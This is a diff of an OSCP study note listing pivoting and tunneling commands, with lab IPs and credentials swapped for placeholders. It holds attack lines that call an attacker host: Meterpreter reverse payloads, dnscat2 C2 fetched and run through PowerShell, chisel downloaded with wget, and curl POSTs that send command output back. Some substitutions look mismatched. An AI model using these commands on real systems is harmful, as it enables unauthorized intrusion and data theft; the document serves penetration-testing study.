@@ -11,10 +11,10 @@ Part of [[COMMAND APPENDIX]]. Exact syntax for pivoting and tunneling tools -- n
 socat -ddd TCP-LISTEN:PORT,fork TCP:DEST_IP:DEST_PORT
 
 # Example: forward port 2345 on CONFLUENCE01 to postgres on PGDATABASE01
-socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+socat -ddd TCP-LISTEN:2345,fork TCP:$BoxIP:5432
 
 # Example: forward port 2222 → SSH on PGDATABASE01
-socat -ddd TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+socat -ddd TCP-LISTEN:2222,fork TCP:$BoxIP:22
 ```
 
 **Confirm it's listening:**
@@ -24,8 +24,8 @@ ss -ntplu   # look for TCP *:2345 owned by socat
 
 **Connect from Kali through the forward:**
 ```bash
-psql -h 192.168.50.63 -p 2345 -U postgres
-ssh database_admin@192.168.50.63 -p2222
+psql -h $BoxIP -p 2345 -U postgres
+ssh $Username@$BoxIP -p2222
 ```
 
 No-socat fallback (when socat isn't installed):
@@ -49,11 +49,11 @@ ssh -N -L [BIND_IP:]LOCAL_PORT:DEST_IP:DEST_PORT user@SSH_SERVER
 # 0.0.0.0 = listen on all interfaces (omitting IP binds to loopback only)
 
 # Example: CONFLUENCE01 listens on :4455, forwards SMB to HRSHARES via PGDATABASE01
-ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 -o StrictHostKeyChecking=no
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 $Username@$BoxIP -o StrictHostKeyChecking=no
 
 # Kali connects to the pivot's listening port
-smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
-smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
+smbclient -p 4455 -L //$BoxIP/ -U $Username --password=$Password
+smbclient -p 4455 //$BoxIP/scripts -U $Username --password=$Password
 ```
 
 **Prerequisite (when running from a reverse shell):**
@@ -72,14 +72,14 @@ Opens a SOCKS proxy on the **SSH client** (pivot). All proxychains traffic route
 ssh -N -D [BIND_IP:]PORT user@SSH_SERVER
 
 # Example: SOCKS proxy on all interfaces :9999 on CONFLUENCE01, SSH server = PGDATABASE01
-ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215 -o StrictHostKeyChecking=no
+ssh -N -D 0.0.0.0:9999 $Username@$BoxIP -o StrictHostKeyChecking=no
 
 # Update /etc/proxychains4.conf on Kali:
 # [ProxyList]
-# socks5 192.168.50.63 9999
+# socks5 $BoxIP 9999
 
 # Use proxychains on Kali:
-proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+proxychains smbclient -L //172.16.50.217/ -U $Username --password=$Password
 proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
 ```
 
@@ -107,7 +107,7 @@ ssh -N -R [BIND_IP:]BIND_PORT:DEST_IP:DEST_PORT kali@KALI_IP
 # Binding to 127.0.0.1 keeps the listening port local to Kali only
 
 # Example: Kali loopback :2345, forwards to PGDATABASE01:5432
-ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 -o StrictHostKeyChecking=no
+ssh -N -R 127.0.0.1:2345:$BoxIP:5432 kali@$BoxIP -o StrictHostKeyChecking=no
 
 # From Kali:
 psql -h 127.0.0.1 -p 2345 -U postgres
@@ -116,7 +116,7 @@ psql -h 127.0.0.1 -p 2345 -U postgres
 **Port conflict fix:** if nc listener is already on target port, pick a different local port:
 ```bash
 # nc on 4444, so use 5555 instead:
-ssh -N -R 127.0.0.1:5555:10.4.50.215:4444 kali@KALI_IP -o StrictHostKeyChecking=no
+ssh -N -R 127.0.0.1:5555:$BoxIP:4444 kali@KALI_IP -o StrictHostKeyChecking=no
 ```
 
 ---
@@ -131,7 +131,7 @@ ssh -N -R PORT kali@KALI_IP   # only one socket argument (no destination)
 # Binds to Kali loopback by default
 
 # Example:
-ssh -N -R 9998 kali@192.168.118.4 -o StrictHostKeyChecking=no
+ssh -N -R 9998 kali@$BoxIP -o StrictHostKeyChecking=no
 
 # Check pivot OpenSSH version first:
 ssh -V   # need OpenSSH 7.6+
@@ -141,7 +141,7 @@ ssh -V   # need OpenSSH 7.6+
 # socks5 127.0.0.1 9998
 
 # Use proxychains on Kali exactly as with dynamic forward:
-proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n $BoxIP
 ```
 
 ---
@@ -155,10 +155,10 @@ No proxychains prefix needed. Kali must have root; SSH server (pivot) must have 
 sshuttle -r user@PIVOT_IP:PORT SUBNET1/24 SUBNET2/24
 
 # Example: tunnel via CONFLUENCE01's Socat forward to PGDATABASE01 as SSH server
-sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+sshuttle -r $Username@$BoxIP:2222 $BoxIP/24 172.16.50.0/24
 
 # After running, connect transparently without proxychains:
-smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+smbclient -L //172.16.50.217/ -U $Username --password=$Password
 ```
 
 ---
@@ -170,14 +170,14 @@ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
 sudo nano /etc/proxychains4.conf
 
 # [ProxyList] section must match the SOCKS port in use:
-socks5 192.168.50.63 9999    # SSH dynamic (local forward), pivot host + port
+socks5 $BoxIP 9999    # SSH dynamic (local forward), pivot host + port
 socks5 127.0.0.1 9998        # SSH remote dynamic, Kali loopback port
 
 # After any sed edit, always verify:
 sudo tail -3 /etc/proxychains4.conf
 
 # Sed to update ProxyList (match exact current line):
-sudo sed -i 's/socks5 192.168.50.63 9999/socks5 127.0.0.1 9998/' /etc/proxychains4.conf
+sudo sed -i 's/socks5 $BoxIP 9999/socks5 127.0.0.1 9998/' /etc/proxychains4.conf
 # Warning: if the current entry is already socks5 but pattern says socks4, sed silently does nothing
 ```
 
@@ -270,10 +270,10 @@ xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:127.0.0.1:9833
 
 ```cmd
 REM Add portproxy rule:
-netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$BoxIP connectport=22 connectaddress=$BoxIP
 
 REM Add Windows Firewall rule to allow the new port:
-netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=$BoxIP localport=2222 action=allow
 
 REM Confirm portproxy:
 netsh interface portproxy show all
@@ -283,12 +283,12 @@ netstat -anp TCP | find "2222"
 
 REM Cleanup (always do this after):
 netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
-netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=$BoxIP
 ```
 
 From Kali:
 ```bash
-ssh database_admin@192.168.50.64 -p2222
+ssh $Username@$BoxIP -p2222
 ```
 
 ---
@@ -311,7 +311,7 @@ Full MSF-based pivot, no SSH needed on the pivot host.
 
 ```bash
 # 1. Generate Linux Meterpreter payload
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=8080 -f elf -o pivot.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=8080 -f elf -o pivot.elf
 
 # 2. Catch it
 msfconsole -q
@@ -396,7 +396,7 @@ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o bind.exe
 use exploit/multi/handler
 set payload windows/x64/meterpreter/bind_tcp
 set LPORT 8080
-set RHOST <pivot-host-ip>
+set RHOST $BoxIP
 run
 ```
 
@@ -424,16 +424,16 @@ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
 
 ```bash
 # Transfer rpivot dir to pivot host (scp -r), then:
-python2.7 client.py --server-ip <kali-ip> --server-port 9999
+python2.7 client.py --server-ip $LocalIP --server-port 9999
 ```
 
 Requires `socks4 127.0.0.1 9050` in proxychains.conf. Uses Python 2.7.
 
 **With upstream NTLM corporate proxy on the pivot host:**
 ```bash
-python2.7 client.py --server-ip <kali-ip> --server-port 9999 \
-  --ntlm-proxy-ip <proxy-ip> --ntlm-proxy-port <proxy-port> \
-  --domain <domain> --username <user> --password <pass>
+python2.7 client.py --server-ip $LocalIP --server-port 9999 \
+  --ntlm-proxy-ip $LocalIP --ntlm-proxy-port $Port \
+  --domain $Domain --username $Username --password $Password
 ```
 
 ---
@@ -447,15 +447,15 @@ C2 over DNS queries. Server = Kali (Ruby). Client = Windows target (PowerShell).
 git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/server/
 sudo gem install bundler && bundle install
-sudo ruby dnscat2.rb --dns host=<kali-ip>,port=53,domain=<domain> --no-cache
+sudo ruby dnscat2.rb --dns host=$LocalIP,port=53,domain=$Domain --no-cache
 # Note the pre-shared secret printed at startup
 ```
 
 ```powershell
 # On Windows target — download and run client
-(New-Object Net.WebClient).DownloadFile('http://<kali-ip>/dnscat2.ps1', 'dnscat2.ps1')
+(New-Object Net.WebClient).DownloadFile('http://$LocalIP/dnscat2.ps1', 'dnscat2.ps1')
 Import-Module .\dnscat2.ps1
-Start-Dnscat2 -DNSServer <kali-ip> -Domain <domain> -PreSharedSecret <secret> -Exec cmd
+Start-Dnscat2 -DNSServer $LocalIP -Domain $Domain -PreSharedSecret <secret> -Exec cmd
 ```
 
 ```
@@ -494,10 +494,10 @@ ss -ntplu | grep 1080
 # --- On pivot (CONFLUENCE01 via CVE-2022-26134 injection) ---
 
 # Download binary:
-wget <kali-ip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+wget $LocalIP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 
 # Start client (R:socks = reverse SOCKS proxy on server's port 1080):
-/tmp/chisel client <kali-ip>:8080 R:socks
+/tmp/chisel client $LocalIP:8080 R:socks
 ```
 
 Chisel server confirms:
@@ -509,14 +509,14 @@ session#N: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 ```bash
 sudo apt install ncat
 
-ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<internal-host>
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@$BoxIP
 # %h and %p are SSH placeholders replaced with the target host and port at runtime
 ```
 
 **Blind command output collection pattern (when you have no stderr back from the injection):**
 ```bash
 # Run command, redirect ALL output to file, POST it back via curl:
-/tmp/chisel client <kali-ip>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://<kali-ip>:8080/
+/tmp/chisel client $LocalIP:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://$LocalIP:8080/
 # &> redirects stdout+stderr; curl --data @/file sends file contents as POST body
 # Your Chisel server or tcpdump shows the POST body with the error text
 ```
@@ -529,14 +529,14 @@ When a tool hardcodes `127.0.0.1:PORT` and you just need one service exposed, sk
 
 ```bash
 # Client on pivot:
-/tmp/chisel client <kali-ip>:8080 R:<local-port>:<internal-host>:<internal-port>
+/tmp/chisel client $LocalIP:8080 R:$Port:$BoxIP:<internal-port>
 
 # Example: bind 4141 on Kali loopback, forward to PGDATABASE01:8008 via CONFLUENCE01
-/tmp/chisel client <kali-ip>:8080 R:4141:10.4.249.215:8008
+/tmp/chisel client $LocalIP:8080 R:4141:$BoxIP:8008
 # Kali's 127.0.0.1:4141 now routes to PGDATABASE01:8008 through CONFLUENCE01
 ```
 
-Server confirms: `tun: proxy#R:127.0.0.1:4141=>10.4.249.215:8008: Listening`
+Server confirms: `tun: proxy#R:127.0.0.1:4141=>$BoxIP:8008: Listening`
 
 ---
 
@@ -553,12 +553,12 @@ When you need BOTH a full SOCKS proxy (for proxychains) AND a specific port forw
 taskkill /F /IM chisel.exe
 
 # Then:
-.\chisel.exe client <KALI>:8080 R:1081:socks R:80:172.16.6.241:80
+.\chisel.exe client $LocalIP:8080 R:1081:socks R:80:172.16.6.241:80
 # R:1081:socks    → SOCKS5 proxy on Kali:1081 (use in proxychains4.conf)
 # R:80:172.16.6.241:80  → Kali port 80 forwards to INTERNALSRV1's web server
 
 # Linux pivot (same syntax, different binary)
-/tmp/chisel client <KALI>:8080 R:1081:socks R:4141:10.4.50.215:8008
+/tmp/chisel client $LocalIP:8080 R:1081:socks R:4141:$BoxIP:8008
 ```
 
 **proxychains4.conf** entry (matches the SOCKS port above):
@@ -589,13 +589,13 @@ See [[27. Assembling the Pieces#27.4.2 Services and Sessions — Internal Networ
 Bring a remote host's listening port to your local loopback without an interactive shell:
 
 ```bash
-ssh -fNL <localport>:<remote-host>:<remoteport> user@<ssh-server>
+ssh -fNL $Port:$BoxIP:$Port user@<ssh-server>
 # -f = fork to background after password
 # -N = no remote shell, port forward only
 # -L = local port forward
 
 # Example: bring FELINEAUTHORITY's localhost:4141 to Kali's localhost:4141
-ssh -fNL 4141:127.0.0.1:4141 kali@192.168.249.7
+ssh -fNL 4141:127.0.0.1:4141 kali@$BoxIP
 
 # Use when: a tool hardcodes 127.0.0.1:PORT but the actual listener
 # (e.g. dnscat2 listen) is bound on a remote host.
@@ -639,10 +639,10 @@ When you can execute commands but can't see the output (web shell injection, bli
 
 ```bash
 # On the target — run command, collect output, POST back:
-<any-command> &> /tmp/output; curl --data @/tmp/output http://<kali-ip>:<port>/
+<any-command> &> /tmp/output; curl --data @/tmp/output http://$LocalIP:$Port/
 
 # On Kali — listen with nc (shows raw HTTP POST body):
-nc -lvnp <port>
+nc -lvnp $Port
 
 # Or: listen with a running Chisel server — output appears in tcpdump or Chisel server log
 ```
@@ -664,7 +664,7 @@ chmod +x chisel_1.7.6_linux_amd64
 # Output: "Listening on http://0.0.0.0:9001"
 
 # On Kali — run as client (creates SOCKS5 on 127.0.0.1:1080)
-./chisel_1.7.6_linux_amd64 client -v <pivot-host-ip>:9001 socks
+./chisel_1.7.6_linux_amd64 client -v $BoxIP:9001 socks
 ```
 
 Update proxychains.conf:
@@ -697,10 +697,10 @@ cd ~
 scp -r ptunnel-ng ubuntu@<pivot-host>:~/
 
 # On pivot host — run as server (forwards to local SSH port 22)
-sudo ./ptunnel-ng/src/ptunnel-ng -r<pivot-host-ip> -R22
+sudo ./ptunnel-ng/src/ptunnel-ng -r$BoxIP -R22
 
 # On Kali — run as client (TCP :2222 → ICMP → pivot → pivot:22)
-sudo ./ptunnel-ng/src/ptunnel-ng -p<pivot-host-ip> -l2222 -r<pivot-host-ip> -R22
+sudo ./ptunnel-ng/src/ptunnel-ng -p$BoxIP -l2222 -r$BoxIP -R22
 ```
 
 **Use via SSH through the ICMP tunnel:**
@@ -759,3 +759,14 @@ Proxifier.exe → Profile → Proxy Servers → Add: 127.0.0.1:1080, SOCKS5
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/19. Port Redirection and SSH Tunneling]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
